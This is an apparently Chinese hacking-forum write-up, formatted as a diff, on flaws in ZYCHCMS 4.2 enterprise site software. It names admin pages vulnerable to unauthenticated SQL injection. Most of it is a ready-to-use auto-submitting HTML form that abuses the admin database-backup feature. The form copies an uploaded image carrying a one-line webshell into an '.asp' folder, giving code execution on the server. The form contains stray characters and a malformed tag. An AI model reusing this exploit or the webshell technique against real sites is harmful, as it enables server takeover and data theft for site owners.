@@ -1,0 +1,52 @@
+影响版本：ZYCHCMS企业网站管理系统4.2（存在以下两个文件的版本应该是通杀）
+①SQL注射漏洞
+漏洞文件：/admin/add_js.asp & /admin/add_xm_jiang.asp
+漏洞原因：未过滤
+漏洞代码：
+都是相同的，文件开头没有调用过滤文件/admin/seeion.asp，导致没有对当前权限进行判断，就直接操作数据库。
+修复方法：在文件开头加入代码
+
+②后台拿WBSHELL
+进入后台有一个数据库备份，可以通过本地提交突破创建.asp后缀文件夹，并将一句话备份进去。
+这里在网上找了一个，改了下，将就着用。
+以下是代码本地提交代码
+
+
+<form method=”post” action=”http://www.shitsec.com/admin/Manage_backup.asp?action=Backup” name=add>
+ <!–eg:http://www.shitsec.com/admin/Manage_backup.asp?action=Backup–>
+<tr>
+<td height=”30″ background=”images/bg_list.gif”><div style=”padding-left:10px; font-weight:bold; color:#FFFFFF; text-align:left”>备份数据库</div></td>
+</tr>
+<tr>
+<td bgcolor=”#FFFFFF”><span class=”back_southidc”>
+</span>
+<table width=”100%” border=”0″ align=”center” cellpadding=”5″ cellspacing=”0″ >
+<tr onmouseover=”style.backgroundColor=’#EEEEEE’” onmouseout=”style.backgroundColor=’#F1F5F8′” bgcolor=”#F1F5F8″ >
+<td height=”25″ width=”30%” class=”td”><div align=”left”>当前数据库路径</div></td>
+<td width=”70%” class=”td”>90sec. K5 L9 v8 S8 d
+<div align=”left”>
+<input type=”text” size=”30″ name=”DBpath” value=”此处为你在其网站上传的图片格式一句话路径” />
+<!–eg：../uploadfile/image/Logo/20120803130885328532_ZYCH.jpg>
+<input type=”hidden” size=”50″ name=”bkfolder” value=”123.asp” />
+</div></td>
+</tr>
+<tr onmouseover=”style.backgroundColor=’#EEEEEE’” onmouseout=”style.backgroundColor=’#FFFFFF’” bgcolor=”#FFFFFF”>
+<td height=”25″ width=”30%” class=”td”><div align=”left”>备份数据库名称</div></td>
+<td class=”td”><div align=”left”>
+<input type=”text” size=”30″ name=”bkDBname” value=”4.mdb” />
+[如备份目录有该文件，将覆盖，如沒有，将自动创建]</div></td>
+</tr>
+<tr onmouseover=”style.backgroundColor=’#EEEEEE’” onmouseout=”style.backgroundColor=’#F1F5F8′” bgcolor=”#F1F5F8″>
+<td height=”25″ width=”30%” class=”td”><div align=”left”></div></td>
+<td class=”td”><div align=”left”>
+<input type=”submit” value=”确定备份” class=”btn”
+</div></td>
+</tr>
+</table></td></tr></form>
+</table>
+</td>
+</tr>
+</table>
+<script>
+document.all.add.submit();
+</script>
